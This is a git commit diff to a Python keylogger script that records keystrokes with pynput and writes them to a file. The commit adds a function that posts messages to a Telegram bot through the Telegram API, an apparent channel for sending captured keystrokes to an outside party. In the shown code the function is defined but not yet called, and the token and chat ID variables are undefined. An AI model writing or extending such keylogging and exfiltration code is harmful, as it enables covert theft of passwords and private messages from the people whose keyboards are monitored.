c63317035845d145fdaf200d155d2885cf92ab2a
DoubleY <141092504+y44li@users.noreply.github.com>
2025-12-06 15:51:45 +0100

    Add Telegram log sending feature
    added a sendingkeys() function that sends messages to Telegram using the bot API.
    prints the HTTP status and response for debugging.

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,5 @@
 from pynput import keyboard
-
+import requests
 
 
 def OnPress(key) : # Define the function for handling key presses
@@ -10,12 +10,24 @@ def OnPress(key) : # Define the function for handling key presses
             f.write(key.char)
         except AttributeError: 
             f.write(f'[{key}]') # for special keys (shift, ctrl...)
+
+def sendingkeys(message):
+    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
+    payload = {"chat_id": chatID, "text": message}
+
+    try:
+        r = requests.post(url, data=payload)
+        print("Status:", r.status_code)
+        print("Response:", r.text)
+    except Exception as e:
+        print("Something went wrong:", e)
             
     
 # Create the keyboard listener with `on_press` handler       
 with keyboard.Listener (
     on_press = OnPress) as listener :
     listener.join()
+
 
 
 
